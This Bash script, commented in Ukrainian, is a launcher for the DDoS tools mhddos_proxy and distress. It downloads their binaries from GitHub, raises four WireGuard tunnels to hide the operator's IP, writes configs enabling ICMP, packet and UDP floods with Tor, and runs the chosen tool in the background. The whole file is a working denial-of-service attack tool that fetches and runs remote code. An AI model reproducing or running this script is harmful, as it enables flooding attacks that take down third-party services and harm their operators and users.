#!/bin/bash
set -e

# === Кольорові функції ===
print_header() {
    echo -e "\e[1;36m========================================"
    echo -e "🚀  Запуск Kaljan747"
    echo -e "========================================\e[0m"
}

print_summary() {
    echo -e "\n\e[1;33m----------------------------------------"
    echo -e "📦  Встановлення залежностей: \e[1;32mOK\e[0m"
    echo -e "🌍  Завантаження WG-конфігів: \e[1;32mOK\e[0m"
    echo -e "⚙️  Запуск модуля: PID $1"
    echo -e "----------------------------------------\e[0m"
}

print_stage() {
    echo -e "\e[1;34m$1\e[0m"
}

SETTINGS_FILE="$HOME/.kaljan747_settings"
LOG_DIR="$HOME/logs"
LOG_FILE="$LOG_DIR/wg.log"
MODULE_DIR="$HOME/modules"
WG_DIR="$HOME/wg_confs"

mkdir -p "$LOG_DIR" "$MODULE_DIR" "$WG_DIR"
touch "$LOG_FILE"

# === Встановлення прав доступу ===
set_permissions() {
    echo -e "\n📁  Встановлюю права доступу до папок і файлів..."

    sudo mkdir -p "$MODULE_DIR" "$WG_DIR"

    if [ -f "$MODULE_DIR/mhddos_proxy" ]; then
        sudo chmod +x "$MODULE_DIR/mhddos_proxy"
    else
        echo "[-] Файл mhddos_proxy не знайдено!"
    fi

    if [ -f "$MODULE_DIR/distress" ]; then
        sudo chmod +x "$MODULE_DIR/distress"
    else
        echo "[-] Файл distress не знайдено!"
    fi

    sudo chmod 644 "$MODULE_DIR/mhddos.ini" "$MODULE_DIR/distress.ini"
    sudo chown -R "$USER:$USER" "$HOME"
    sudo chmod -R 755 "$LOG_DIR"
    sudo chmod 644 "$LOG_FILE"
    echo -e "✅ Права доступу встановлено."
}

download_wg_configs() {
    echo -e "\n📥 Завантаження WG-конфігів..."
    WG_REPO_URL="https://github.com/k7771/Kaljan747/tree/k7771/wg"
    CONF_LIST=$(curl -fsSL "$WG_REPO_URL" | grep -oP '(?<=href=").*?\.conf(?=")' | sed -e 's|^/|https://raw.githubusercontent.com/|' -e 's|blob/|raw/|')
    if [ -z "$CONF_LIST" ]; then
        echo "[-] Не вдалося знайти конфігураційні файли за вказаним URL."
        exit 1
    fi
    for url in $CONF_LIST; do
        file=$(basename "$url")
        wget -qO "$WG_DIR/$file" "$url" || { echo "[-] Не вдалося завантажити $file"; exit 1; }
    done
}

install_dependencies() {
    if command -v apt >/dev/null 2>&1; then
        sudo apt update -y
        sudo apt install -y curl wget git screen sed wireguard zenity
    else
        echo "Підтримуваний пакетний менеджер не знайдено."
        exit 1
    fi
}

ask_user_id() {
    if [ -n "$DISPLAY" ] && command -v zenity >/dev/null 2>&1; then
        USER_ID=$(zenity --entry --title="Введення USER-ID" --text="Введіть ваш user-id (тільки цифри):" --width=400)
    else
        read -p "Введіть ваш user-id (тільки цифри): " USER_ID
    fi
}

ask_run_parameters() {
    if [ -n "$DISPLAY" ] && command -v zenity >/dev/null 2>&1; then
        USER_SELECTION=$(zenity --forms --title="Kaljan747 Конфігурація" \
            --text="Вкажіть параметри запуску" \
            --add-combo="Модуль" --combo-values="mhddos_proxy|distress" \
            --add-combo="Редагувати INI перед запуском?" --combo-values="Так|Ні" \
            --add-combo="Режим запуску" --combo-values="screen у фоні|screen відкрито|без screen" \
            --width=400)
        [ -z "$USER_SELECTION" ] && { echo "Запуск скасовано"; exit 1; }
        IFS="|" read -r SELECTED_MODULE EDIT_INI SELECTED_RUN_MODE <<< "$USER_SELECTION"
    else
        echo "Виберіть модуль:"
        echo "1) mhddos_proxy"
        echo "2) distress"
        read -p "Ваш вибір (1/2): " mod_choice
        SELECTED_MODULE=$( [ "$mod_choice" = "1" ] && echo "mhddos_proxy" || echo "distress" )

        echo "Редагувати INI перед запуском?"
        echo "1) Так"
        echo "2) Ні"
        read -p "Ваш вибір (1/2): " edit_choice
        EDIT_INI=$( [ "$edit_choice" = "1" ] && echo "Так" || echo "Ні" )

        echo "Виберіть режим запуску:"
        echo "1) screen у фоні"
        echo "2) screen відкрито"
        echo "3) без screen"
        read -p "Ваш вибір (1/2/3): " run_choice
        case "$run_choice" in
            1) SELECTED_RUN_MODE="screen у фоні";;
            2) SELECTED_RUN_MODE="screen відкрито";;
            3) SELECTED_RUN_MODE="без screen";;
        esac
    fi
}

# === Встановлення обох модулів ===
MHDDOS_BIN="$MODULE_DIR/mhddos_proxy"
DISTRESS_BIN="$MODULE_DIR/distress"

[ -f "$MHDDOS_BIN" ] || wget -qO "$MHDDOS_BIN" "https://github.com/porthole-ascend-cinnamon/mhddos_proxy_releases/releases/latest/download/mhddos_proxy_linux"
chmod +x "$MHDDOS_BIN"

[ -f "$DISTRESS_BIN" ] || wget -qO "$DISTRESS_BIN" "https://github.com/Yneth/distress-releases/releases/latest/download/distress_x86_64-unknown-linux-musl"
chmod +x "$DISTRESS_BIN"

# === Завантаження/ввід параметрів ===
if [ -f "$SETTINGS_FILE" ]; then source "$SETTINGS_FILE"; fi

if [ -z "$USER_ID" ]; then
    while true; do
        ask_user_id
        [[ "$USER_ID" =~ ^[0-9]+$ ]] && break
        echo "USER-ID має містити лише цифри!"
    done
fi

if [ -z "$SELECTED_MODULE" ] || [ -z "$EDIT_INI" ] || [ -z "$SELECTED_RUN_MODE" ]; then
    ask_run_parameters
fi

# === FIX: очистка пробілів у SELECTED_MODULE ===
SELECTED_MODULE=$(echo "$SELECTED_MODULE" | xargs)

# === Встановлення прав доступу ===
set_permissions

# === Завантаження конфігів ===
download_wg_configs

# === Встановлення залежностей ===
install_dependencies

# === Зупинка всіх WG ===
for iface in $(wg show interfaces 2>/dev/null); do
    sudo wg-quick down "$iface" 2>/dev/null || true
    sudo ip link delete "$iface" 2>/dev/null || true
done

# === Підключення до 4-х WG тунелів ===
WG_FILES=($(find "$WG_DIR" -name "*.conf" -type f | shuf))
WG_IFACES=()
INDEX=0

while [ "${#WG_IFACES[@]}" -lt 4 ] && [ "$INDEX" -lt "${#WG_FILES[@]}" ]; do
    conf="${WG_FILES[$INDEX]}"
    IFACE_NAME=$(basename "$conf" .conf)
    sudo wg-quick up "$conf" 2>/dev/null || true
    sleep 2
    if curl -s --interface "$IFACE_NAME" --max-time 5 https://api.ipify.org >/dev/null 2>&1; then
        echo -e "✅ Інтерфейс $IFACE_NAME працює."
        echo "$(date '+%Y-%m-%d %H:%M:%S') ✅ $IFACE_NAME працює." >> "$LOG_FILE"
        WG_IFACES+=("$IFACE_NAME")
    else
        echo -e "❌ $IFACE_NAME не працює. Відключаю."
        echo "$(date '+%Y-%m-%d %H:%M:%S') ❌ $IFACE_NAME не працює." >> "$LOG_FILE"
        sudo wg-quick down "$IFACE_NAME" 2>/dev/null || true
        sudo ip link delete "$IFACE_NAME" 2>/dev/null || true
    fi
    INDEX=$((INDEX+1))
done

VPN_LIST=$(IFS=' '; echo "${WG_IFACES[*]}")
VPN_LIST_COMMAS=$(IFS=','; echo "${WG_IFACES[*]}")

# === Генерація ini файлів ===
echo "--use-my-ip 0 --copies 4 -t 12000 --ifaces $VPN_LIST --user-id=$USER_ID" > "$MODULE_DIR/mhddos.ini"
echo "--use-my-ip 0 --enable-icmp-flood --enable-packet-flood --direct-udp-mixed-flood --use-tor 30 --disable-auto-update -c 40000 --interface=$VPN_LIST_COMMAS --user-id=$USER_ID" > "$MODULE_DIR/distress.ini"

# === Вибір модуля ===
case "$SELECTED_MODULE" in
    mhddos_proxy)
        MODULE="$MHDDOS_BIN"
        CONFIG_FILE="$MODULE_DIR/mhddos.ini"
        MODULE_NAME="mhddos"
        ;;
    distress)
        MODULE="$DISTRESS_BIN"
        CONFIG_FILE="$MODULE_DIR/distress.ini"
        MODULE_NAME="distress"
        ;;
    *)
        echo "❌ Невідомий модуль: $SELECTED_MODULE"
        exit 1
        ;;
esac

# === Редагування INI ===
if [ "$EDIT_INI" = "Так" ]; then
    if [ -n "$DISPLAY" ]; then
        zenity --text-info --editable --filename="$CONFIG_FILE" --title="Редагування INI" > "$CONFIG_FILE.tmp"
        mv "$CONFIG_FILE.tmp" "$CONFIG_FILE"
    else
        nano "$CONFIG_FILE"
    fi
fi

# === Запуск модуля ===
echo -e "⚙️  Запускаю модуль..."
case "$SELECTED_RUN_MODE" in
    "screen у фоні") 
        screen -dmS "$MODULE_NAME" "$MODULE" $(cat "$CONFIG_FILE")
        PID=$(pgrep -f "$MODULE")
        ;;
    "screen відкрито") 
        screen -S "$MODULE_NAME" "$MODULE" $(cat "$CONFIG_FILE")
        PID=$(pgrep -f "$MODULE")
        ;;
    "без screen") 
        "$MODULE" $(cat "$CONFIG_FILE") &
        PID=$!
        ;;
esac

print_summary "$PID"
exit 0
